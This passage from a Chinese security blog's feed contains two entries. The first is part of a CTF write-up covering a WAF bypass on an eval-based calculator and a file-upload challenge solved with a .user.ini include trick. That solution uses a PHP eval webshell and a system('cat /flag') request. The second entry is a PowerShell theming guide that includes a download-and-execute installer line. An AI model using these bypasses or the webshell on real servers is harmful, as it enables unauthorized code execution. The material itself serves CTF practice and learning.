$_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>本来我以为calc.php中的过滤即为waf，但是及时我们输入符合过滤规则题目也会触发报错，应该是加了waf，那么我们的请求的流程就是<code>提交请求-&gt;waf过滤-&gt;calc.php中再次过滤并执行</code>，这样的话按照上面的思路，我们可以在字段<code>num</code>前面加个空格，waf不会过滤该字段(因为该字段为<code>num</code>)，在PHP后端又会解析为<code>num</code>，这样就绕过了过滤</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:27779&#x2F;calc.php?%20num&#x3D;phpinfo()</span><br></pre></td></tr></table></div></figure><p>查看禁用函数</p><p><img src="/2020/04/02/buuctf/13.png" alt></p><p>发现命令执行的函数被禁用了，那么我们可以使用<code>scandir</code>函数来获得目录，用<code>file_get_contents</code>来读文件，因为引号被过滤了，所以我们用asicc码来构造文件名</p><p><img src="/2020/04/02/buuctf/14.png" alt></p><p><img src="/2020/04/02/buuctf/15.png" alt></p><p>PS: 通过查看题目waf过滤规则可以看到题目过滤的仅仅是参数<code>num</code>，如果被拦截则会返回403</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SecRule ARGS:num &quot;@rx [a-zA-Z_\x7f-\xff\x00-\x24][a-zA-Z_0-9\x7f-\xff\x00-\x24]*&quot; &quot;id:001,msg:&#39;Hack&#39;,severity:ERROR,deny,status:403&quot;</span><br></pre></td></tr></table></div></figure><hr><p>此题目还有另一种方法可以绕过，就是利用HTTP走私攻击<span class="exturl"><a class="exturl__link" href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，当请求包含两个<code>Content-Length</code>时可以实现HTTP走私</p><p><img src="/2020/04/02/buuctf/16.png" alt></p><p>因为waf服务器看到请求头中有两个content-length会返回400错误，但是后端却依然会处理该请求</p>        <h1 id="SUCTF-2019-CheckIn">          <a href="#SUCTF-2019-CheckIn" class="heading-link"><i class="fas fa-link"></i></a>[SUCTF 2019]CheckIn</h1>      <p>题目简化了一下,直接给出了源码，核心部分如下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filesize too big!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filename cannot be empty!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htacess/i"</span>, $extension)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"illegal suffix!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"exif_imagetype:not image!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . <span class="string">"/"</span> . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Your dir "</span> . $userdir. <span class="string">' &lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your files : &lt;br&gt;'</span>;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>过滤有三个：</p><blockquote><ol><li>文件名中不得出现<code>ph</code>或<code>htacess</code></li><li>文件内容不得以<code>&lt;?</code>开头</li><li>exif_imagetype()函数校验图片</li></ol></blockquote><p>依次绕过：</p><blockquote><ol><li>上传文件后缀修改为jpg</li><li>用标签<code>&lt;script language=&quot;php&quot;&gt;phpinfo();@eval($_REQUEST[&#39;snow&#39;]);&lt;/script&gt;</code>来包裹PHP语句</li><li>添加文件头</li></ol></blockquote><p>接下来就是设法将jpg文件解析为PHP文件从而getshell，通过<code>.user.ini</code>文件可以实现该功能，在PHP官方文档中有详细的解释</p><p><span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener"></a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><img src="/2020/04/02/buuctf/17.png" alt></p><p>PHP启动时会在每个目录下扫描.user.ini文件，从被执行的PHP文件目录开始一直上升到web根目录。如果被执行的PHP文件在web根目录之外，则只扫描该目录。需要注意的是<strong>在.user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</strong><span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/en/ini.list.php" target="_blank" rel="noopener">https://www.php.net/manual/en/ini.list.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>可以查询配置名和设置模式，其中，有两个设置项很关键</p><blockquote><p><strong>auto_prepend_file</strong>: 指定在加载主文件之前解析的文件，相当于在主文件最前面加一个<code>require</code>语句<br><strong>auto_append_file</strong>： 与上面类似，只不过是在主文件结束之后解析</p></blockquote><p>所以攻击思路就是先上传一个.user.ini文件，指定要包含的jpg文件；然后上传jpg文件getshell</p><p>上传<code>.user.ini</code>文件</p><p><img src="/2020/04/02/buuctf/18.png" alt></p><p><code>#difine ...</code> 是为了绕过exif_imagetype()函数</p><p>然后上传<code>exp.jpg</code></p><p><img src="/2020/04/02/buuctf/19.png" alt></p><p>然后即可getflag</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ec4f3f55-24f4-49f2-84e5-58b3b5f49a95.node3.buuoj.cn&#x2F;uploads&#x2F;76d9f00467e5ee6abc3ca60892ef304e&#x2F;index.php?snow&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></div></figure><p><img src="/2020/04/02/buuctf/20.png" alt></p><blockquote><p>这个漏洞感觉实际利用可能性不大，因为不大可能会有奇葩程序员会在保存上传文件的文件夹下放一个可执行的PHP文件</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今年寒假真的太长了，后半年又因为考研什么都没学，趁这段时间复现学习一波~&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
      <category term="Web" scheme="http://chaosec.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>oh-my-posh美化PowerShell</title>
    <link href="http://chaosec.top/2020/03/22/psbeautify/"/>
    <id>http://chaosec.top/2020/03/22/psbeautify/</id>
    <published>2020-03-22T06:29:44.000Z</published>
    <updated>2020-09-13T10:13:45.177Z</updated>
    
    <content type="html"><![CDATA[<p>爱美之心，人皆有之</p><a id="more"></a><p>Windows下的shell真的是丑出天际，字体也非常别扭，之前用的cmder，刚开始相比cmd的话，确实是美观多了，不过使用了一段时间之后又觉得很丑了，而且cmder实现原理在于把一些常用的linux命令在windows下编译为可执行文件，这样就导致一定的命令延迟，这让我觉得莫名的别扭（好吧，我就是审美奇葩），在加上最近准备把powershell作为主力shell，而默认的PowerShell比CMD还要感人，需要进行一下美化</p><p>oh-my-posh是windows下的主题工具，借鉴于linux下的oh-my-zsh，我此次就是利用该工具来美化PS</p>        <h1 id="安装包管理器">          <a href="#安装包管理器" class="heading-link"><i class="fas fa-link"></i></a>安装包管理器</h1>      <p><code>scoop</code>是Windows下一款非常好用的包管理工具，能够自动设置环境变量，类似于linux下的apt等包管理工具，官网<span class="exturl"><a class="exturl__link" href="https://scoop.sh/" target="_blank" rel="noopener">Click Here</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy RemoteSigned -scope CurrentUser # 设置powershell执行策略</span><br><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;get.scoop.sh&#39;) # 安装scoop</span><br></pre></td></tr></table></div></figure><p>安装完成后，输入<code>scoop</code>，如下所示即说明安装成功</p><p><img src="/2020/03/22/psbeautify/1.png" alt></p><p>安装git与posh-git</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scoop install -g git</span><br><span class="line">scoop bucket add extras</span><br><span class="line">scoop install posh-git</span><br></pre></td></tr></table></div></figure><p>安装oh-my-posh</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scoop install oh-my-posh</span><br></pre></td></tr></table></div></figure><p>安装过程中如果出现超时错误的话请扶墙</p>        <h1 id="安装字体">          <a href="#安装字体" class="heading-link"><i class="fas fa-link"></i></a>安装字体</h1>      <p>中文环境下，默认的ps字体不仅不美观，而且很多特殊字符也不支持，这会导致后面修改主题时看不到效果，出现乱码，而powershell的字体要求非常高，一般的字体无法在原生的ps终端使用，根据其它大佬的测试，<code>Sarasa Gothic</code>字体是符合ps的苛刻要求的，<span class="exturl"><a class="exturl__link" href="https://github.com/be5invis/Sarasa-Gothic/releases" target="_blank" rel="noopener">Github地址</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><strong>安装powerline字体</strong></p><p>除了上述字体之外，还可以安装powerline系列字体，能够很好的适配，Github地址<span class="exturl"><a class="exturl__link" href="https://github.com/powerline/fonts" target="_blank" rel="noopener">在这</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>下载之后选择自己喜欢的字体安装，也可以运行<code>install.ps1</code>全部安装</p>        <h1 id="启用oh-my-posh">          <a href="#启用oh-my-posh" class="heading-link"><i class="fas fa-link"></i></a>启用oh-my-posh</h1>      <p>接下来需要编写配置文件，才能够让配置每次自动生效，配置路径在<code>$profile</code>中，我们可以输入该变量查看配置文件位置</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜ $profile</span><br><span class="line">C:\Users\Snow\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</span><br></pre></td></tr></table></div></figure><p>配置文件内容如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module DirColors</span><br><span class="line">Import-Module Posh-git</span><br><span class="line">Import-Module oh-my-posh</span><br></pre></td></tr></table></div></figure><p><code>DirColors</code>是一个对输出进行着色的模块</p><p><strong>配置主题：</strong><br>oh-my-posh内置多个主题，使用<code>Set-Theme</code>命令可以预览主题，TAB键可以切换不同的主题，我个人比较喜欢<code>Honukai</code>主题<br>在修改主题后，需要将改动写入配置文件<code>$profile</code>中，否则下次启动就还是原主题，在配置文件中加一行内容</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Theme Honukai</span><br></pre></td></tr></table></div></figure><p><strong>修改配置：</strong></p><p>输入<code>$ThemeSettings</code>可以查看当前设置</p><p>修改用户名</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ThemeSettings.CurrentUser &#x3D; &#39;aesm1p&#39;</span><br></pre></td></tr></table></div></figure><p>如果想要永久生效需要将上述命令写入配置文件<code>$profile</code></p>        <h1 id="第三方终端">          <a href="#第三方终端" class="heading-link"><i class="fas fa-link"></i></a>第三方终端</h1>      <p>在按照上述方法配置之后，PS就能够使用了。不过，虽然原生PS运行效率高，速度快，可由于PS太过底层，导致颜值控们进行美化修改时存在诸多限制，比如字体，上文提到的能在原生ps下使用的字体寥寥无几，选择空间有限，而且界面配色，背景等设置在PS中也非常困难，而通过第三方终端可以很方便的进行设置美化</p>        <h2 id="Windows-Terminal">          <a href="#Windows-Terminal" class="heading-link"><i class="fas fa-link"></i></a>Windows Terminal</h2>      <p>个人最推荐的一款，微软爸爸官方开源，维护很及时，而且字体的锯齿消除做的是最好的，而且官方应用优化也是更加的独到，缺点是目前配置主要使用json文件来配置，没有gui界面，对小白不太友好，不过WindowsTerminal有完善的官方文档指导还是很贴心的。<br>安装该软件需要windows10版本为1903以上，可以通过Microsoft Store安装，也可以在github下载安装，通过store安装的话能够自动更新，手动安装无法自动获取更新。<br>安装完成之后进入软件打开设置<code>settings.json</code>，设置文件结构为：<br><figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"theme"</span>: <span class="string">"light"</span>, <span class="comment">//主题有light,dark,system三种</span></span><br><span class="line">  <span class="attr">"profiles"</span>: <span class="comment">//配置选项</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"defaults"</span>:</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//此处添加全局配置</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"list"</span>:</span><br><span class="line">    [</span><br><span class="line">      <span class="comment">//单独配置</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"schemes"</span>: <span class="comment">//配色方案，以列表形式存储</span></span><br><span class="line">  [</span><br><span class="line">    &#123;&#125;,<span class="comment">//scheme</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"keybindings"</span>:<span class="comment">//绑定快捷键，具体可修改的快捷键参数可以查阅官方文档</span></span><br><span class="line">  [</span><br><span class="line">    &#123;&#125;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br>了解清楚配置文件结构之后添加相应的配置参数即可，主要是字体大小，配色方案，键绑定等，这里贴上我的配置方案<br><figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This file was initially generated by Windows 终端(未打包) 1.2.200825001-release1.2</span></span><br><span class="line"><span class="comment">// It should still be usable in newer versions, but newer versions might have additional</span></span><br><span class="line"><span class="comment">// settings, help text, or changes that you will not see unless you clear this file</span></span><br><span class="line"><span class="comment">// and let us generate a new one for you.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// To view the default settings, hold "alt" while clicking on the "Settings" button.</span></span><br><span class="line"><span class="comment">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"$schema"</span>: <span class="string">"https://aka.ms/terminal-profiles-schema"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// "defaultProfile": "&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;",</span></span><br><span class="line">    <span class="attr">"theme"</span>: <span class="string">"light"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// You can add more global application settings here.</span></span><br><span class="line">    <span class="comment">// To learn more about global settings, visit https://aka.ms/terminal-global-settings</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// If enabled, selections are automatically copied to your clipboard.</span></span><br><span class="line">    <span class="attr">"copyOnSelect"</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If enabled, formatted data is also copied to your clipboard</span></span><br><span class="line">    <span class="attr">"copyFormatting"</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A profile specifies a command to execute paired with information about how it should look and feel.</span></span><br><span class="line">    <span class="comment">// Each one of them will appear in the 'New Tab' dropdown,</span></span><br><span class="line">    <span class="comment">//   and can be invoked from the commandline with `wt.exe -p xxx`</span></span><br><span class="line">    <span class="comment">// To learn more about profiles, visit https://aka.ms/terminal-profile-settings</span></span><br><span class="line">    <span class="attr">"profiles"</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"defaults"</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Put settings here that you want to apply to all profiles.</span></span><br><span class="line">            <span class="attr">"name"</span>:<span class="string">"PowerShell"</span>,</span><br><span class="line">            <span class="attr">"source"</span>: <span class="string">"Windows.Terminal.PowershellCore"</span>,</span><br><span class="line">            <span class="attr">"colorScheme"</span>: <span class="string">"One Half Dark"</span>,</span><br><span class="line">            <span class="attr">"cursorColor"</span>:<span class="string">"#FFFFFF"</span>,</span><br><span class="line">            <span class="attr">"fontFace"</span>:<span class="string">"Meslo LG M for Powerline"</span>,</span><br><span class="line">            <span class="attr">"fontSize"</span>:<span class="number">10</span>,</span><br><span class="line">            <span class="attr">"cursorShape"</span>:<span class="string">"filledBox"</span>,</span><br><span class="line">            <span class="attr">"startingDirectory"</span>:<span class="string">"your dir"</span>,</span><br><span class="line">            <span class="attr">"backgroundImage"</span> : <span class="string">"image path"</span>,</span><br><span class="line">            <span class="attr">"backgroundImageOpacity"</span>: <span class="number">0.3</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"list"</span>:</span><br><span class="line">        [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Make changes here to the powershell.exe profile.</span></span><br><span class="line">                <span class="attr">"guid"</span>: <span class="string">"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;"</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"Windows PowerShell"</span>,</span><br><span class="line">                <span class="attr">"commandline"</span>: <span class="string">"powershell.exe"</span>,</span><br><span class="line">                <span class="attr">"hidden"</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Make changes here to the cmd.exe profile.</span></span><br><span class="line">                <span class="attr">"guid"</span>: <span class="string">"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;"</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"命令提示符"</span>,</span><br><span class="line">                <span class="attr">"commandline"</span>: <span class="string">"cmd.exe"</span>,</span><br><span class="line">                <span class="attr">"hidden"</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// &#123;</span></span><br><span class="line">            <span class="comment">//     "guid": "&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;",</span></span><br><span class="line">            <span class="comment">//     "hidden": false,</span></span><br><span class="line">            <span class="comment">//     "name": "Azure Cloud Shell",</span></span><br><span class="line">            <span class="comment">//     "source": "Windows.Terminal.Azure"</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"guid"</span>: <span class="string">"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;"</span>,</span><br><span class="line">                <span class="attr">"hidden"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"Azure"</span>,</span><br><span class="line">                <span class="attr">"source"</span>: <span class="string">"Windows.Terminal.Azure"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"guid"</span>: <span class="string">"&#123;b453ae62-4e3d-5e58-b989-0a998ec44156&#125;"</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"Python InterAction"</span>,</span><br><span class="line">                <span class="attr">"commandline"</span>: <span class="string">"py"</span>,</span><br><span class="line">                <span class="attr">"hidden"</span>: <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add custom color schemes to this array.</span></span><br><span class="line">    <span class="comment">// To learn more about color schemes, visit https://aka.ms/terminal-color-schemes</span></span><br><span class="line">    <span class="attr">"schemes"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="attr">"name"</span> : <span class="string">"Frost"</span>,</span><br><span class="line">                <span class="attr">"background"</span> : <span class="string">"#FFFFFF"</span>,</span><br><span class="line">                <span class="attr">"black"</span> : <span class="string">"#3C5712"</span>,</span><br><span class="line">                <span class="attr">"blue"</span> : <span class="string">"#17b2ff"</span>,</span><br><span class="line">                <span class="attr">"brightBlack"</span> : <span class="string">"#749B36"</span>,</span><br><span class="line">                <span class="attr">"brightBlue"</span> : <span class="string">"#27B2F6"</span>,</span><br><span class="line">                <span class="attr">"brightCyan"</span> : <span class="string">"#13A8C0"</span>,</span><br><span class="line">                <span class="attr">"brightGreen"</span> : <span class="string">"#89AF50"</span>,</span><br><span class="line">                <span class="attr">"brightPurple"</span> : <span class="string">"#F2A20A"</span>,</span><br><span class="line">                <span class="attr">"brightRed"</span> : <span class="string">"#F49B36"</span>,</span><br><span class="line">                <span class="attr">"brightWhite"</span> : <span class="string">"#741274"</span>,</span><br><span class="line">                <span class="attr">"brightYellow"</span> : <span class="string">"#991070"</span>,</span><br><span class="line">                <span class="attr">"cyan"</span> : <span class="string">"#3C96A6"</span>,</span><br><span class="line">                <span class="attr">"foreground"</span> : <span class="string">"#000000"</span>,</span><br><span class="line">                <span class="attr">"green"</span> : <span class="string">"#6AAE08"</span>,</span><br><span class="line">                <span class="attr">"purple"</span> : <span class="string">"#991070"</span>,</span><br><span class="line">                <span class="attr">"red"</span> : <span class="string">"#8D0C0C"</span>,</span><br><span class="line">                <span class="attr">"white"</span> : <span class="string">"#6E386E"</span>,</span><br><span class="line">                <span class="attr">"yellow"</span> : <span class="string">"#991070"</span></span><br><span class="line">            &#125;</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add custom keybindings to this array.</span></span><br><span class="line">    <span class="comment">// To unbind a key combination from your defaults.json, set the command to "unbound".</span></span><br><span class="line">    <span class="comment">// To learn more about keybindings, visit https://aka.ms/terminal-keybindings</span></span><br><span class="line">    <span class="attr">"keybindings"</span>:</span><br><span class="line">    [</span><br><span class="line">        <span class="comment">// Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.</span></span><br><span class="line">        <span class="comment">// These two lines additionally bind them to Ctrl+C and Ctrl+V.</span></span><br><span class="line">        <span class="comment">// To learn more about selection, visit https://aka.ms/terminal-selection</span></span><br><span class="line">        &#123; <span class="attr">"command"</span>: &#123;<span class="attr">"action"</span>: <span class="string">"copy"</span>, <span class="attr">"singleLine"</span>: <span class="literal">false</span> &#125;, <span class="attr">"keys"</span>: <span class="string">"ctrl+c"</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">"command"</span>: <span class="string">"paste"</span>, <span class="attr">"keys"</span>: <span class="string">"ctrl+v"</span> &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Press Ctrl+Shift+F to open the search box</span></span><br><span class="line">        &#123; <span class="attr">"command"</span>: <span class="string">"find"</span>, <span class="attr">"keys"</span>: <span class="string">"ctrl+shift+f"</span> &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Press Alt+Shift+D to open a new pane.</span></span><br><span class="line">        <span class="comment">// - "split": "auto" makes this pane open in the direction that provides the most surface area.</span></span><br><span class="line">        <span class="comment">// - "splitMode": "duplicate" makes the new pane use the focused pane's profile.</span></span><br><span class="line">        <span class="comment">// To learn more about panes, visit https://aka.ms/terminal-panes</span></span><br><span class="line">        &#123; <span class="attr">"command"</span>: &#123; <span class="attr">"action"</span>: <span class="string">"splitPane"</span>, <span class="attr">"split"</span>: <span class="string">"auto"</span>, <span class="attr">"splitMode"</span>: <span class="string">"duplicate"</span> &#125;, <span class="attr">"keys"</span>: <span class="string">"alt+shift+d"</span> &#125;,</span><br><span class="line">        &#123;<span class="attr">"command"</span>: <span class="string">"closeTab"</span>, <span class="attr">"keys"</span>: <span class="string">"ctrl+delete"</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br>最终效果如下：<br><img src="/2020/03/22/psbeautify/12.png" alt></p>        <h2 